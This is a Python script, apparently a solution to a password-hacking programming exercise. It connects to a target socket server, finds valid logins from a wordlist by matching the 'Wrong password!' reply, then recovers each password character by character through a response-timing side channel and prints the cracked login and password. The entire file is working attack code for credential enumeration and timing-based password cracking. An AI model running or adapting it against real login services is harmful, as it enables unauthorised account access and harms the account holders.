import sys
import socket
import json
import string
import time

args = sys.argv  # get args of command line
address = (args[1], int(args[2]))

with socket.socket() as client_socket, open('logins.txt', 'r') as logins:  # try to pick up login
    client_socket.connect(address)
    is_broken = False  # For break loop
    for login in [i.strip() for i in logins]:
        client_socket.send(json.dumps({'login': login, 'password': ''}).encode())
        if json.loads(client_socket.recv(1000).decode())['result'] == 'Wrong password!':
            password = ''
            while True:
                # trying to pick up one char from password
                for letter in string.ascii_letters + string.digits:
                    client_socket.send(json.dumps({'login': login, 'password': password + letter}).encode())
                    start = time.perf_counter()  # time of start receiving response
                    response = json.loads(client_socket.recv(1000).decode())['result']
                    end = time.perf_counter()  # time of end receiving response
                    if response == 'Connection success!':  # if password was found
                        print(json.dumps({'login': login, 'password': password + letter}))
                        is_broken = True
                        break
                    elif end - start >= 0.0009:
                        password += letter
                if is_broken:
                    break
            break
